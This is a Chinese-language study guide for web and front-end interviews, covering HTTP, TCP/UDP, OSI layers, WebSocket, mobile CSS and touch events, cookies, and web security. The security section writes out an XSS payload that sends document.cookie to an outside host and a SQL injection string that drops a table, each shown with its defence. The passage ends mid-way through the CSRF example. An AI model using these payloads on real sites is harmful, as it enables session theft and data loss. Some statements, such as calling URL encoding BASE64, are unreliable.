第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.
GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。
第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息
从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等
第三部分：空行，请求头部后面的空行是必须的
即使第四部分的请求数据为空，也必须有空行。
第四部分：请求数据也叫主体，可以添加任意的其他数据。
这个例子的请求数据为空。
POST请求例子，使用Charles抓取的request：
POST / HTTP1.1
Host:www.wrox.com
User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)
Content-Type:application/x-www-form-urlencoded
Content-Length:40
Connection: Keep-Alive

name=Professional%20Ajax&publisher=Wiley
第一部分：请求行，第一行明了是post请求，以及http1.1版本。
第二部分：请求头部，第二行至第六行。
第三部分：空行，第七行的空行。
第四部分：请求数据，第八行。
HTTP之响应消息Response
一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。
HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。
例子
HTTP/1.1 200 OK
Date: Fri, 22 May 2009 06:07:21 GMT
Content-Type: text/html; charset=UTF-8
<html>
      <head></head>
      <body>
            <!--body goes here-->
      </body></html>
第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。
第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）
第二部分：消息报头，用来说明客户端要使用的一些附加信息
第二行和第三行为消息报头，
Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8
第三部分：空行，消息报头后面的空行是必须的
第四部分：响应正文，服务器返回给客户端的文本信息。
空行后面的html部分为响应正文。
HTTP之状态码
状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:
1xx：指示信息--表示请求已接收，继续处理
2xx：成功--表示请求已被成功接收、理解、接受
3xx：重定向--要完成请求必须进行更进一步的操作
4xx：客户端错误--请求有语法错误或请求无法实现
5xx：服务器端错误--服务器未能实现合法的请求
常见状态码：
200 OK                        //客户端请求成功400 Bad Request               //客户端请求有语法错误，不能被服务器所理解401 Unauthorized              //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden                 //服务器收到请求，但是拒绝提供服务404 Not Found                 //请求资源不存在，eg：输入了错误的URL500 Internal Server Error     //服务器发生不可预期的错误503 Server Unavailable        //服务器当前不能处理客户端的请求，一段时间后可能恢复正常
HTTP请求方法
根据HTTP标准，HTTP请求可以使用多种请求方法。
HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。
HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。
GET     请求指定的页面信息，并返回实体主体。
HEAD     类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头
POST     向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。
PUT     从客户端向服务器传送的数据取代指定的文档的内容。DELETE      请求服务器删除指定的页面。CONNECT     HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。
OPTIONS     允许客户端查看服务器的性能。TRACE     回显服务器收到的请求，主要用于测试或诊断。
HTTP工作原理
HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。
以下是 HTTP 请求/响应的步骤：
1、客户端连接到Web服务器
一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。
2、发送HTTP请求
通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。
3、服务器接受请求并返回HTTP响应
Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。
4、释放连接TCP连接
若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;
5、客户端浏览器解析HTML内容
客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。
例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：
1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;
2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;
3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;
4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;
5、释放 TCP连接;
6、浏览器将该 html 文本并显示内容; 　　
GET和POST请求的区别
GET请求
GET /books/?sex=man&name=Professional HTTP/1.1
Host: www.wrox.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)
Gecko/20050225 Firefox/1.0.1
Connection: Keep-Alive
注意最后一行是空行
POST请求
POST / HTTP/1.1
Host: www.wrox.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)
Gecko/20050225 Firefox/1.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Connection: Keep-Alive

name=Professional%20Ajax&publisher=Wiley
1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&连接；例 如：login.action?name=hyddd&password=idontknow&verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。
POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据
因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变
2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。
而在实际开发中存在的限制主要有：
GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。
因此对于GET提交时，传输数据就会受到URL长度的 限制。
POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。
3、安全性
POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击
4、Http get,post,soap协议都是在http上运行的
（1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的
查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全
（2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。
但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。
（3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式
Content-type设置为: text/xml 任何数据都可以xml化。
Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息.
我们看看GET和POST的区别
1.GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&相连，如EditPosts.aspx?name=test1&id=123456. POST方法是把提交的数据放在HTTP包的Body中.
2.GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.
3.GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。
GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.
5.关于Http 2.0 你知道多少？

    HTTP/2引入了“服务端推（server push）”的概念，它允许服务端在客户端需要数据之前就主动地将数据发送到客户端缓存中，从而提高性能。

    HTTP/2提供更多的加密支持

    HTTP/2使用多路技术，允许多个消息在一个连接上同时交差。

它增加了头压缩（header compression），因此即使非常小的请求，其请求和响应的header都只会占用很小比例的带宽。
6.TCP UDP IP
首先知道TCP是一种面向连接的、可靠的、基于字节流的运输层（Transport layer）通信协议。是专门为了在不可靠的互联网络上提供一个可靠的端到端字节流而设计的。每一次TCP连接都需要三个阶段：连接建立、数据传送和连接释放。“三次握手”就发生在连接建立阶段。


4.协议栈的层次划分：7层网络模型，4层网络模型，每一层有哪些协议：


5.网络数据抓包工具有哪些？
答：Wireshark ，Fiddler，network monitor



6，TCP UDP的区别？什么使用用TCP，什么时候用UDP？
答：首先传输控制协议TCP是一种面向连接的、可靠的、基于字节流的运输层（Transport layer）通信协议。是专门为了在不可靠的互联网络上提供一个可靠的端到端字节流而设计的。

用户数据报协议UDP是 ISO 参考模型中一种无连接的传输层协议，提供面向操作的简单不可靠的非连接传输层服务。

他们之间有三方面区别：

第一：TCP是基于连接的，可靠性高;UDP基于无连接，可靠性较低。

第二：由于TCP是连接的通信，需要有三次握手、重新确认等连接过程，会有时延，实时性差；同时过程复杂，也使其易于被攻击；而UDP无连接，无建立连接的过程，因而实时性较强，也稍安全。

 第三：在传输相同大小的数据时，TCP首部开销20字节;UDP的首部开销小，只有8个字节，TCP报头比UDP复杂，故实际包含的用户数据较少。TCP无丢包，而UDP有丢包，故TCP的开销大，UDP开销较小。

第四：每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信
应用方面：

 1.由于TCP的实时性差，故对实时性要求高和高速传输的场合需用UDP。

 2.TCP适用于传输大量数据，对可靠性要求高的环境；而在可靠性要求较低，追求效率时可用UDP。



7.IP,端口号，网关，DNS，路由，掩码作用？

答：1、IP是能使连接到网上的所有计算机网络实现相互通信的一套规则，规定了计算机在因特网上进行通信时应当遵守的规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。

2：端口号：在网络技术中，端口（Port）大致有两种意思：一是物理意义上的端口，比如，ADSL Modem、集线器、交换机、路由器用于连接其他网络设备的接口。二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口，通俗话来说端口号就好比你家的门牌号，端口就是把你家的门，有了这个端口号，送信员就知道这座楼那个门送了。。



3、网关:用于两个高层协议不同的网络互连。网关是一种充当转换重任的计算机系统或设备。使用在不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。

4，DNS：因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。



5.路由：是指把数据从一个地方传送到另一个地方的行为和动作。


6.子网掩码的作用，就是将某个IP地址划分成网络地址和主机地址两部分。
7.说说TCP传输的三次握手四次挥手策略

    为了准确无误地把数据送达目标处，TCP协议采用了三次握手策略。用TCP协议把数据包送出去后，TCP不会对传送 后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志：SYN和ACK。

    发送端首先发送一个带SYN标志的数据包给对方。
    接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。
    最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。
    若在握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。


断开一个TCP连接则需要“四次握手”：

    第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。

    第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号）。

    第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。

第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。
8. Websocket
Websocket特征
•建立在http服务之上
•连接建立之后会upgrade至数据帧协议，进而实现服务端和客户端的交互
•全双工通信



Websocket原理

	现很多网站为了实现即时通讯，所用的技术都是轮询(polling)。轮询是在特定的的时间间隔（如每1秒），由浏览器对服务器发出HTTP request，然后由服务器返回最新的数据给客户端的浏览器。这种传统的HTTP request 的模式带来很明显的缺点 – 浏览器需要不断的向服务器发出请求，然而HTTP request 的header是非常长的，里面包含的有用数据可能只是一个很小的值，这样会占用很多的带宽。
	而比较新的技术去做轮询的效果是Comet – 用了AJAX。但这种技术虽然可达到全双工通信，但依然需要发出请求。
	在 WebSocket API，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送。在此WebSocket 协议中，为我们实现即时服务带来了两大好处：
		1. Header
			互相沟通的Header是很小的-大概只有 2 Bytes
		2. Server Push
			服务器的推送，服务器不再被动的接收到浏览器的request之后才返回数据，而是在有新数据时就主动推送给浏览器。
9.安全连接过程
网络服务与安全
安全连接的过程：
•根据数字证书进行认证
•进行加密传输
•交换公钥
•客户端使用服务端的公钥进行加密
•服务端使用服务端私钥就行解密
•服务端使用客户端的公钥进行加密
•客户端使用客户端的私钥解密
 10.会话层  表示层  应用层
会话层的功能
   会话层的主要功能是在两个节点间建立、维护和释放面向用户的连接，并对会话进行管理和控制，保证会话数据可靠传送。
    在会话层和传输层我们都提到了连接，那么会话连接和传输连接到底有什么区别呢？
      假设你对你的秘书说，给琼斯先生打个电话，这时你相当于会话层，而秘书相当于传输层。你的请求就相当于请求一个会话。你提出建立连接的要求，但不必自己动手查找电话号码、拨号等。秘书着手打电话，开始建立传输连接。当拨号成功，对方拎起话筒，传输连接就建立起来了。然后，你接过电话，此时会话层(连接)建立成功。

会话连接和传输连接之间有三种关系：一对一关系，即一个会话连接对应一个传输连接；一对多关系，一个会话连接对应多个传输连接；多对一关系，多个会话连接对应一个传输关系，好比打电话，一个人讲完后可以换另一个人讲话，而不必让电信局知道换了人讲话。会话过程中，会话层需要决定到底使用全双工通信还是半双工通信。如果采用全双工通信，则会话层在对话管理中要做的工作就很少；如果采用半双工通信，会话层则通过一计算机网络技术2个数据令牌来协调会话，保证每次只有一个用户能够传输数据。当会话层建立一个会话时，先让一个用户得到令牌。只有获得令牌的用户才有权进行发送。如果接收方想要发送数据，可以请求获得令牌。由发送方决定何时放弃。一旦得到令牌，接收方就转变为发送方。当我们进行大量的数据传输时，例如你正在下载一个100M 的文件，当下载到95M 时，网络断线了，这时怎么办？是否需要重头再传？为了解决这个问题，会话层提供了同步服务，通过在数据流中定义检查点(Checkpoint)来把会话分割成明显的会话单元。当网络故障出现时，从最后一个检查点开始重传数据。常见的会话层协议有：结构化查询语言（SQL）；远程进程呼叫（RPC）；X-windows 系统；AppleTalk 会话协议；数字网络结构会话控制协议（DNA SCP）等。




表示层的功能
表示层主要是负责数据格式的转换，压缩与解压缩，加密与解密。
      OSI 模型中，表示层以下的各层主要负责数据在网络中传输时不要出错。但数据的传输没有出错，并不代表数据所表示的信息不会出错。例如你想下午两点从杭州出发去上海，于是你对上海的朋友说，“我下午两点来”，可是你的朋友却理解为两点钟到达上海。所以这句话虽然没有听错，却因为不同的理解，产生了完成不同的结果。
    表示层就专门负责这些有关网络中计算机信息表示方式的问题。表示层负责在不同的数据格式之间进行转换操作，以实现不同计算机系统间的信息交换。 两台计算机之间的信息交换除了编码外，还包括数组、浮点数、记录、图像、声音等多种数据结构，表示层用抽象的方式来定义交换中使用的数据结构，并且在计算机内部表示法和网络的标准表示法之间进行转换。
    表示层还负责数据的加密，以在数据的传输过程对其进行保护。数据在发送端被加密，在接收端解密。使用加密密钥来对数据进行加密和解密。表示层还负责文件的压缩，通过算法来压缩文件的大小，降低传输费用。




 应用层
应用层是网络体系中最高的一层，也是唯一面向用户的一层，应用层将为用户提供常用的应用程序，并实现网络服务的各种功能。常用的电子邮件、上网浏览等网络服务，都是应用层的程序。
应用层主要是面对用户访问网络的。主要有一些应用程序，如：DNS,FTP,E-mail，Telnet，HTTP。
OSI模型的总结
OSI模型上层（会话层，表示层，应用层）处理用户接口、数据格式、应用访问。
OSI模型下层（物理层，数据链路层，网络层，传输层）处理数据在网络介质中的传送。
19.移动端篇
1. jQuery Mobile
jQuery Mobile 是创建移动 web 应用程序的框架。

jQuery Mobile 适用于所有流行的智能手机和平板电脑。

jQuery Mobile 使用 HTML5 和 CSS3 通过尽可能少的脚本对页面进行布局。



jQuery Mobile Tap

	tap 事件在用户敲击某个元素时触发。

	下面的例子当 <p> 元素上触发 tap 事件时，隐藏当前 <p> 元素：
	实例

	$("p").on("tap",function(){
 	 $(this).hide();
	});


jQuery Mobile Taphold

	taphold 事件在用户敲击某个元素并保持一秒时被触发：
	实例

	$("p").on("taphold",function(){
 	 $(this).hide();
	});


jQuery Mobile Swipe

	swipe 事件在用户在某个元素上水平滑动超过 30px 时被触发：
	实例

	$("p").on("swipe",function(){
  		$("span").text("Swipe detected!");
	});

2.媒体查询
1.Media Query的使用方法

首先我们在使用Media的时候需要先设置下面这段代码，来兼容移动设备的展示效果：

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">


参数解释：

    width = device-width：宽度等于当前设备的宽度
    initial-scale：初始的缩放比例（默认设置为1.0）
    minimum-scale：允许用户缩放到的最小比例（默认设置为1.0）
    maximum-scale：允许用户缩放到的最大比例（默认设置为1.0）
    user-scalable：用户是否可以手动缩放（默认设置为no，因为我们不希望用户放大缩小页面）

使用：

    @media 设备类型 and （设备特性）{样式代码}

2.Ｍedia Query的设备类型（10种）

    all：所有设备
    screen：电脑显示器
    print：打印用纸或打印预览视图
    handled：便携设备
    tv：电视机类型的设备
    …

3.CSS中的Media Query的设备特性（13种）

    设备宽高：device-width,device-height
    渲染窗口的宽和高：width,height
    设备的手持方向：orientation
    设备的分辨率：resolution
    …


使用navigator.userAgent

操作系统是什么，cpu型号，浏览器版本号，内核版本号等，当然还有pc还是移动端的信息

比如是android 有一个mobile单词，用它来判断是否是移动
3.响应式布局

移动端（Android iOS）怎么做好用体验？

清晰的视觉纵线
信息的分组、极致的减法
利用选择代替输入
标签及文字的排布方式
依靠明文确认密码
合理的键盘利用
在iPhone中的显示

现在的网页大多是按照宽度为800px左右的标准进行制作的，故Safari浏览器按照980px的宽度来显示，就可以正常显示绝大多数的网页了。

所以iPhone中的Safari浏览器也不会应用小尺寸窗口运行时的样式，也是选择窗口宽度为980px时所应用的样式。因此，可以加入meta标签来指定窗口宽度来显示。

<meta name='viewport' content='width=600px' />


@media (orientation: landscape) {/* 横屏 */
            #div1{
                background: #ff0000;
            }
        }
        @media (orientation: portrait) {/* 竖屏 */
            #div1{
                background: #00ff00;
            }
        }


         @media (max-width: 767px) {
            #div1{
                background: #0f0;
            }
        }
        @media (max-width: 480px) {
            #div1{
                background: #00f;
            }
        }


 @media (max-width: 959px) {
            h3{
                width: 100%;
            }
            section{
                width: 100%;
            }
            #left{
                width: 67%;
                /*margin-right: 3%;*/
            }
            #right{
                width: 30%;
            }
            figure{
                width: 100%;
            }
            figure img{
                width: 100%;
                max-width: 100%;
                min-width: 30%;
            }
        }
        @media (max-width: 480px) {
            #left, #right{
                width: 100%;
            }
        }


$(function(){
            function isPC(){
                if(navigator.userAgent.indexOf("Mobile") != -1){
                    return false;
                }else{
                    return true;
                }
            }
            var $div1 = $("#div1");


bootstrap中媒体查询中创建关键了3个分界点阈值：

    超小屏幕 手机 (<768px)
    小屏幕 平板 (≥768px)
    中等屏幕 桌面显示器 (≥992px)
大屏幕 大桌面显示器 (≥1200px)
4.	移动端事件
一、click 和 tap 比较

两者都会在点击时触发，但是在手机WEB端，click会有 200~300 ms，所以请用tap代替click作为点击事件。

singleTap和doubleTap 分别代表单次点击和双次点击。



点透现象出现的场景:
当A/B两个层上下z轴重叠，上层的A点击后消失或移开（这一点很重要），并且B元素本身有默认click事件（如a标签）或绑定了click事件。在这种情况下，点击A/B重叠的部分，就会出现点透的现象。
点透现象出现的原因：
zepto的tap事件是通过兼听绑定在document上的touch事件来完成tap事件的模拟的，并且tap事件是冒泡到document上触发的！

二、关于tap的点透处理

在使用zepto框架的tap来移动设备浏览器内的点击事件，来规避click事件的延迟响应时，有可能出现点透的情况，即点击会触发非当前层的点击事件。


然后给需要“无延迟点击”的元素绑定click事件（注意不再是绑定zepto的tap事件）即可。
当然，你也可以不在body上初始化它，而在某个dom上初始化，这样，只有这个dom和它的子元素才能享受“无延迟”的点击

实践开发中发现，当元素绑定fastclick后，click响应速度比tap还要快一点点。哈哈

（2）、为元素绑定touchend事件，并在内部加上e.preventDefault();

$demo.on('touchend',function(e){
//
 改变了事件名称，tap是在body上才被触发，而touchend是原生的事件，在dom本身上就会被捕获触发

    $demo.hide()

    e.preventDefault();
//
 阻止“默认行为”

})

三、touch事件touch是针对触屏手机上的触摸事件。现今大多数触屏手机webkit内核提供了touch事件的监听，让开发者可以获取用户触摸屏幕时的一些信息。


其中包括：touchstart,touchmove,touchend,touchcancel 这四个事件

touchstart,touchmove,touchend事件可以类比于mousedown，mouseover
 ，mouseup的触发。

touchstart
 ： 当手指触摸到屏幕会触发；


touchmove
 : 当手指在屏幕上移动时，会触发；


touchend
 : 当手指离开屏幕时，会触发；


而touchcancel许多人不知道它在什么时候会被触发而忽略它，其实当你的手指还没有离开屏幕时，有系统级的操作发生时就会触发touchcancel，例如alert和confirm弹框，又或者是Android系统的功能弹窗。


例如：

这4个事件的触发顺序为：

touchstart -> touchmove -> …… -> touchmove ->touchend

但是单凭监听上面的单个事件，不足以满足我们去完成监听在触屏手机常见的一些手势操作，如双击、长按、左右滑动、缩放等手势操作。需要组合监听这些事件去封装对这类手势动作。

其实市面上很多框架都针对手机浏览器封装了这些手势，例如jqmobile、zepto、jqtouch，不过悲剧发生了，对于某些android系统（我自己测试到的在android 4.0.x），touchmove和touchend事件不能被很好的触发，举例子说明下：

比如手指在屏幕由上向下拖动页面时，理论上是会触发 一个 touchstart ，很多次 touchmove ，和最终的 touchend ，可是在android 4.0上，touchmove只被触发一次，触发时间和touchstart 差不多，而touchend直接没有被触发。这是一个非常严重的bug，在google Issue已有不少人提出  http://code.google.com/p/android/issues/detail?id=19827

暂时我只发现在android 4.0会有这个bug，据说 iOS 3.x的版本也会有。

而显然jqmobile、zepto等都没有意识到这个bug对监听实现带来的严重影响，所以在直接使用这些框架的event时，或多或少会出现兼容性问题！（个人亲身惨痛经历）

<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"/>

20.浏览器篇
1. Http Cookie机制及Cookie的实现原理
Cookie是进行网站用户身份，实现服务端Session会话持久化的一种非常好方式。Cookie最早由Netscape公司开发，现在由 IETF 的RFC 6265标准备对其规范，已被所有主流浏览器所支持。

1. 为什么需要Cookie？

	HTTP是一种无状态的协议，客户端与服务器建立连接并传输数据，数据传输完成后，连接就会关闭。再次交互数据需要建立新的连接，因此，服务器无法从连接上跟踪会话，也无法知道用户上一次做了什么。这严重阻碍了基于Web应用程序的交互，也影响用户的交互体验。如：在网络有时候需要用户登录才进一步操作，用户输入用户名密码登录后，浏览了几个页面，由于HTTP的无状态性，服务器并不知道用户有没有登录。
	Cookie是解决HTTP无状态性的有效手段，服务器可以设置或读取Cookie中所包含的信息。当用户登录后，服务器会发送包含登录凭据的Cookie到用户浏览器客户端，而浏览器对该Cookie进行某种形式的存储（内存或硬盘）。用户再次访问该网站时，浏览器会发送该Cookie（Cookie未到期时）到服务器，服务器对该凭据进行验证，合法时使用户不必输入用户名和密码就可以直接登录。
	本质上讲，Cookie是一段文本信息。客户端请求服务器时，如果服务器需要记录用户状态，就在响应用户请求时发送一段Cookie信息。客户端浏览器保存该Cookie信息，当用户再次访问该网站时，浏览器会把Cookie做为请求信息的一部分提交给服务器。服务器检查Cookie内容，以此来判断用户状态，服务器还会对Cookie信息进行维护，必要时会对Cookie内容进行修改。



2. Cookie的类型

	Cookie总时由用户客户端进行保存的（一般是浏览器），按其存储位置可分为：内存式Cookie和硬盘式Cookie。
	内存式Cookie存储在内存中，浏览器关闭后就会消失，由于其存储时间较短，因此也被称为非持久Cookie或会话Cookie。
	硬盘式Cookie保存在硬盘中，其不会随浏览器的关闭而消失，除非用户手工清理或到了过期时间。由于硬盘式Cookie存储时间是长期的，因此也被称为持久Cookie。


3. Cookie的实现原理

	Cookie定义了一些HTTP请求头和HTTP响应头，通过这些HTTP头信息使服务器可以与客户进行状态交互。
	客户端请求服务器后，如果服务器需要记录用户状态，服务器会在响应信息中包含一个Set-Cookie的响应头，客户端会根据这个响应头存储Cookie信息。再次请求服务器时，客户端会在请求信息中包含一个Cookie请求头，而服务器会根据这个请求头进行用户身份、状态等较验。


下面是一个实现Cookie机制的，简单的HTTP请求过程：

1. 客户端请求服务器
	客户端请求IT笔录网站首页，请求头如下：
	GET / HTTP/1.0
	HOST: itbilu.com
2. 服务器响应请求
	Cookie是一种key=value形式的字符串，服务器需要记录这个客户端请求的状态，因此在响应头中包一个Set-Cookie字段。响应头如下：
	HTTP/1.0 200 OK
	Set-Cookie: UserID=itbilu; Max-Age=3600; Version=1
	Content-type: text/html
	……
3. 再次请求时，客户端请求中会包含一个Cookie请求头
客户端会对服务器响应的Set-Cookie头信息进行存储。再次请求时，将会在请求头中包含服务器响应的Cookie信息。请求头如下
	GET / HTTP/1.0
	HOST: itbilu.com
	Cookie: UserID=itbilu
2.安全问题
一、跨站脚本攻击（XSS）
跨站脚本攻击的英文全称是Cross Site Script，为了和样式表区分，缩写为XSS。发生的原因是网站将用户输入的内容输出到页面上，在这个过程中可能有恶意代码被浏览器执行。

跨站脚本攻击可以分为两种：

1). 反射型XSS

它是通过诱使用户打开一个恶意链接，服务端将链接中参数的恶意代码渲染到页面中，再传递给用户由浏览器执行，从而达到攻击的目的。如下面的链接：

http://a.com/a.jsp?name=xss<script>alert(1)</script>
a.jsp将页面渲染成下面的html：

Hello xss<script>alert(1)</script>
这时浏览器将会弹出提示框。

2). 持久型XSS

持久型XSS将恶意代码提交给服务器，并且存储在服务器端，当用户访问相关内容时再渲染到页面中，以达到攻击的目的，它的危害更大。

比如，攻击者写了一篇带恶意JS代码的博客，文章发表后，所有访问该博客文章的用户都会执行这段恶意JS。

Cookie劫持
Cookie中一般保存了当前用户的登录凭证，如果可以得到，往往意味着可直接进入用户帐户，而Cookie劫持也是最常见的XSS攻击。以上面提过的反射型XSS的例子来说，可以像下面这样操作：

首先诱使用户打开下面的链接：

http://a.com/a.jsp?name=xss<script src=http://b.com/b.js></script>
用户打开链接后，会加载b.js，并执行b.js中的代码。b.js中存储了以下JS代码：

var img = document.createElement("img"); img.src = "http://b.com/log?" + escape(document.cookie); document.body.appendChild(img);
上面的代码会向b.com请求一张图片，但实际上是将当前页面的cookie发到了b.com的服务器上。这样就完成了窃取cookie的过程。

防御Cookie劫持的一个简单的方法是在Set-Cookie时加上HttpOnly标识，浏览器禁止JavaScript访问带HttpOnly属性的Cookie。

XSS的防御
1). 输入检查

对输入数据做检查，比如用户名只允许是字母和数字，邮箱必须是指定格式。一定要在后台做检查，否则数据可能绕过前端检查直接发给服务器。一般前后端都做检查，这样前端可以挡掉大部分无效数据。

对特殊字符做编码或过滤，但因为不知道输出时的语境，所以可能会做不适当的过滤，最好是在输出时具体情况具体处理。

2). 输出检查

对渲染到HTML中内容执行HtmlEncode，对渲染到JavaScript中的内容执行JavascriptEncode。

另外还可以使用一些做XSS检查的开源项目。

二、SQL注入
SQL注入常常会听到，它与XSS类似，是由于用户提交的数据被当成命令来执行而造成的。下面是一个SQL注入的例子：

String sql = "select * from user where username = '" + username + "'";
像上面的SQL语句，如果用户提交的username参数是leo，则数据库执行的SQL为：

select * from user where username = 'leo'
但如果用户提交的username参数是leo’; drop table user–，那执行的SQL为：

select * from user where username = 'leo'; drop table user--'
在查询数据后，又执行了一个删除表的操作，这样的后果非常严重。

SQL注入的防御
防止SQL注入最好的方法是使用预编译语句，如下面所示：

String sql = "select * from user where username = ?"; PreparedStatement pstmt = conn.prepareStatement(sql); pstmt.setString(1, username); ResultSet results = pstmt.executeQuery();
不同语言的预编译方法不同，但基本都可以处理。

如果遇到无法使用预编译方法时，只能像防止XSS那样对参数进行检查和编码。

三、跨站请求伪造（CSRF）
跨站请求伪造的英文全称是Cross Site Request Forgery，是由于操作所需的所有参数都能被攻击者得到，进而构造出一个伪造的请求，在用户不知情的情况下被执行。看下面一个例子：

如果a.com网站需要用户登录后可以删除博客，删除博客的请求地址如下：

GET http://a.com/blog/delete?id=1
